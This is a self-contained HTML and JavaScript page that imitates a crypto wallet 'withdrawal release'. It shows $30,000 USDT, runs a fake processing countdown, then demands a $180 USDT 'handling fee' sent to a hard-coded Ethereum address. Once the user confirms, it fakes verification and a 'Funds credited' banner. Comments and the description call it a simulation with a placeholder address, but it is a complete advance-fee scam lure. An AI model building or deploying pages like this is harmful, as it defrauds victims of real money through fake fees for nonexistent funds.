<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Withdrawal Release</title>
  <meta name="description" content="Withdrawal flow simulation."/>
  <style>
    :root{
      --brand-blue: #0052ff;
      --white: #ffffff;
      --card-bg: rgba(255,255,255,0.03);
      --muted-opaque: rgba(255,255,255,0.85);
      --danger: #ff4848;
      --success: #23c36d;
      --glass-border: rgba(255,255,255,0.06);
      --radius: 14px;
      --shadow: 0 10px 30px rgba(2,10,60,0.18);
      --max-width: 520px;
      --font: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:var(--font);-webkit-font-smoothing:antialiased}
    body{
      display:flex;align-items:center;justify-content:center;
      background: linear-gradient(180deg,#0b3bff 0%, #0036b8 100%);
      padding:28px;color:var(--white);
      -webkit-font-smoothing:antialiased;
    }

    .container{
      width:100%;max-width:var(--max-width);background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:var(--radius);padding:22px;border:1px solid var(--glass-border);box-shadow:var(--shadow);
    }

    .header{
      display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;
    }
    .brand{font-size:1.3rem;font-weight:800;letter-spacing:0.4px}
    .subtitle{color:rgba(255,255,255,0.9);font-size:0.9rem}

    .main-amount{text-align:center;margin:10px 0 18px 0;font-size:1.6rem;font-weight:900}
    .muted{color:rgba(255,255,255,0.9)}
    .card{
      background:var(--card-bg);padding:14px;border-radius:12px;border:1px solid var(--glass-border);margin-bottom:12px;
    }

    label{display:block;margin:8px 0 6px;color:var(--muted-opaque);font-weight:700;font-size:0.9rem}

    .row{display:flex;gap:8px}
    .col{flex:1}

    input[type="text"],select{
      width:100%;padding:12px 14px;border-radius:10px;border:none;font-size:1rem;background:#fff;color:#01243a;margin-bottom:10px;
      outline:none;
    }

    .btn{
      width:100%;padding:12px;border-radius:10px;border:none;background:var(--white);color:var(--brand-blue);font-weight:800;font-size:1rem;cursor:pointer;
    }
    .btn.primary{background:var(--brand-blue);color:#fff}
    .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--white)}
    .btn:disabled{opacity:0.6;cursor:not-allowed}

    .cta-swipe{
      display:flex;align-items:center;justify-content:center;margin:0 auto 16px auto;
      width:100%;max-width:360px;background:var(--white);color:var(--brand-blue);
      padding:12px;border-radius:999px;font-weight:800;cursor:pointer;user-select:none;box-shadow:0 8px 20px rgba(0,0,0,0.12);
    }

    .timer{text-align:center;font-weight:800;margin-top:8px;font-size:1.05rem}
    .error{color:var(--danger);font-weight:800;text-align:center;margin-top:8px}
    .support{text-align:center;color:rgba(255,255,255,0.92);font-size:0.92rem;margin-top:8px}

    .address-box{background:#fff;padding:12px;border-radius:8px;border:1px solid #dbe8ff;font-weight:700;color:#002044;word-break:break-all}

    /* modal */
    .backdrop{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;align-items:center;justify-content:center;z-index:80}
    .modal{background:#fff;color:#01223a;padding:18px;border-radius:12px;width:92%;max-width:520px;box-shadow:0 18px 50px rgba(2,10,60,0.25)}
    .modal h3{margin:0 0 8px 0}
    .qr{height:140px;border-radius:8px;background:linear-gradient(45deg,#eef6ff,#dbeaff);display:flex;align-items:center;justify-content:center;margin:12px 0;color:#002044;font-weight:800}

    .success-banner{background:linear-gradient(90deg,#0bbf82,#059a60);color:#023225;padding:12px;border-radius:10px;text-align:center;font-weight:800;margin-top:12px}

    @media (max-width:420px){
      .brand{font-size:1.1rem}
      .main-amount{font-size:1.2rem}
      .modal{padding:12px}
    }
  </style>
</head>
<body>
  <main class="container" role="main" aria-labelledby="brandHeading">
    <div class="header">
      <div>
        <div id="brandHeading" class="brand">Wallet — Withdraw</div>
        <div class="subtitle">Release preview</div>
      </div>
      <div class="subtitle" aria-hidden="true">Auto Payment</div>
    </div>

    <div id="previewCard" class="card" aria-live="polite">
      <div style="display:flex;align-items:center;justify-content:space-between">
        <div>
          <div style="font-size:0.85rem;color:var(--muted-opaque);font-weight:700">Amount</div>
          <div id="displayAmount" class="main-amount">$30,000 USDT</div>
        </div>
        <div style="text-align:right;min-width:170px">
          <div style="font-size:0.85rem;color:var(--muted-opaque);font-weight:700">Network</div>
          <div style="font-weight:800">ERC-20</div>
        </div>
      </div>

      <label for="userAddress">Receiving Address</label>
      <input id="userAddress" type="text" value="0xCd29ed709a29A99337A1d45F65e1f27ff0A220EE" aria-label="Receiving wallet address" />

      <div style="display:flex;gap:10px;margin-top:8px;">
        <button id="startBtn" class="btn primary col">Confirm & Start</button>
        <button id="editBtn" class="btn ghost" style="width:120px">Edit</button>
      </div>

      <p class="support" style="margin-top:12px">This withdrawal is Fast,And Automated .</p>
    </div>

    <section id="processingCard" class="card" style="display:none" aria-hidden="true">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <div style="font-weight:800">Processing</div>
        <div style="font-size:0.9rem;color:var(--muted-opaque)">Secure vault</div>
      </div>
      <p class="muted" style="margin:10px 0 4px 0;">Your withdrawal is being prepared. This will take approximately 40 seconds.</p>
      <div id="processingTimer" class="timer">Processing: 0:40</div>
      <div id="processingSupport" class="support" style="margin-top:8px"></div>
    </section>

    <section id="errorCard" class="card" style="display:none" aria-hidden="true">
      <div style="text-align:center;margin-bottom:8px">
        <div class="error">BLOCKCHAIN VAULT ACTION REQUIRED</div>
        <p class="muted" style="margin-top:8px">A handling fee is displayed to continue the release.</p>
      </div>

      <div style="display:flex;align-items:center;justify-content:space-between;margin-top:6px">
        <div>
          <div style="font-size:0.85rem;color:var(--muted-opaque);font-weight:700">Fee</div>
          <div style="font-weight:900;font-size:1.1rem">$180 USDT</div>
        </div>
        <div style="text-align:right">
          <div style="font-size:0.85rem;color:var(--muted-opaque);font-weight:700">Network</div>
          <div style="font-weight:800">ERC-20</div>
        </div>
      </div>

      <div style="margin-top:12px">
        <button id="payNowBtn" class="btn primary">Get Payment Address</button>
      </div>

      <p style="margin-top:12px;font-size:0.88rem;color:rgba(255,255,255,0.85)">After obtaining the address you may review the provided details. The transaction status will update accordingly.</p>
    </section>

    <section id="successCard" class="card" style="display:none" aria-hidden="true">
      <div class="success-banner">Funds credited — $30,000 USDT</div>
      <p class="muted" style="margin-top:10px;text-align:center">Transaction completed. You can view confirmations and reconciliation details in the activity log.</p>
    </section>
  </main>

  <!-- Modal for payment address (placeholder address shown) -->
  <div id="backdrop" class="backdrop" role="dialog" aria-modal="true" style="display:none">
    <div class="modal" role="document" aria-labelledby="modalTitle">
      <h3 id="modalTitle">Payment Address</h3>
      <p style="margin:0 0 8px 0;font-weight:700">Fee: $180 USDT — Network: ERC-20</p>

      <div class="address-box" id="modalAddress">0x91257A8cFA91f4715CBC9a64f7c7C5C5cc3370e3</div>

      <div class="qr" aria-hidden="true">QR / Placeholder</div>

      <div class="row" style="margin-top:6px">
        <button id="copyBtn" class="btn">Copy Address</button>
        <button id="doneBtn" class="btn primary">I have noted the address</button>
      </div>

      <div style="display:flex;justify-content:flex-end;margin-top:12px">
        <button id="closeModal" class="btn" style="background:#eef2ff;color:#003056">Close</button>
      </div>
    </div>
  </div>

  <script>
    (function(){
      // Elements
      const previewCard = document.getElementById('previewCard');
      const processingCard = document.getElementById('processingCard');
      const errorCard = document.getElementById('errorCard');
      const successCard = document.getElementById('successCard');

      const startBtn = document.getElementById('startBtn');
      const editBtn = document.getElementById('editBtn');
      const userAddress = document.getElementById('userAddress');

      const processingTimer = document.getElementById('processingTimer');
      const processingSupport = document.getElementById('processingSupport');

      const payNowBtn = document.getElementById('payNowBtn');
      const backdrop = document.getElementById('backdrop');
      const closeModal = document.getElementById('closeModal');
      const copyBtn = document.getElementById('copyBtn');
      const doneBtn = document.getElementById('doneBtn');
      const modalAddress = document.getElementById('modalAddress');

      // State
      let intervalId = null;
      let remaining = 40;

      function showSection(section){
        // hide all
        [previewCard, processingCard, errorCard, successCard].forEach(s => s.style.display = 'none');
        if(section) section.style.display = 'block';
      }

      // initial
      showSection(previewCard);

      // basic address validation
      function addrValid(addr){
        return typeof addr === 'string' && addr.trim().length >= 10;
      }

      startBtn.addEventListener('click', ()=>{
        if(!addrValid(userAddress.value)){
          userAddress.focus();
          return;
        }
        // Start processing
        showSection(processingCard);
        remaining = 40;
        updateTimerDisplay(remaining);
        if(intervalId) clearInterval(intervalId);
        intervalId = setInterval(()=>{
          remaining--;
          updateTimerDisplay(remaining);
          if(remaining <= 0){
            clearInterval(intervalId);
            // show error card (fee required)
            showSection(errorCard);
          }
        }, 1000);
      });

      function updateTimerDisplay(seconds){
        const m = Math.floor(seconds/60);
        const s = seconds % 60;
        processingTimer.textContent = `Processing: ${m}:${s < 10 ? '0' : ''}${s}`;
      }

      // Edit button returns to preview for quick changes
      editBtn.addEventListener('click', ()=>{
        showSection(previewCard);
        if(intervalId){ clearInterval(intervalId); intervalId = null; }
      });

      // Pay now opens modal with placeholder fee address
      payNowBtn.addEventListener('click', ()=>{
        // set a placeholder address (non-operational)
        modalAddress.textContent = '0x91257A8cFA91f4715CBC9a64f7c7C5C5cc3370e3';
        backdrop.style.display = 'flex';
      });

      closeModal.addEventListener('click', closeBackdrop);
      doneBtn.addEventListener('click', ()=>{
        // closing modal — emulate verification + arrival
        closeBackdrop();
        showSection(processingCard);
        processingTimer.textContent = 'Verifying payment...';
        // simulate verification then arrival
        setTimeout(()=>{
          let arrival = 10;
          processingTimer.textContent = `Arriving in: ${arrival}s`;
          const arrivalInterval = setInterval(()=>{
            arrival--;
            processingTimer.textContent = `Arriving in: ${arrival}s`;
            if(arrival <= 0){
              clearInterval(arrivalInterval);
              showSection(successCard);
            }
          }, 1000);
        }, 700);
      });

      function closeBackdrop(){
        backdrop.style.display = 'none';
      }

      // Copy address fallback
      copyBtn.addEventListener('click', async ()=>{
        const addr = modalAddress.textContent.trim();
        try {
          await navigator.clipboard.writeText(addr);
          copyBtn.textContent = 'Copied';
          setTimeout(()=> copyBtn.textContent = 'Copy Address', 1600);
        } catch(e){
          alert('Address: ' + addr);
        }
      });

      // Accessibility: Enter triggers start if focused on address
      window.addEventListener('keydown', function(e){
        if(e.key === 'Enter'){
          if(document.activeElement === userAddress){
            startBtn.click();
          }
        }
      });
    })();
  </script>
</body>
</html>
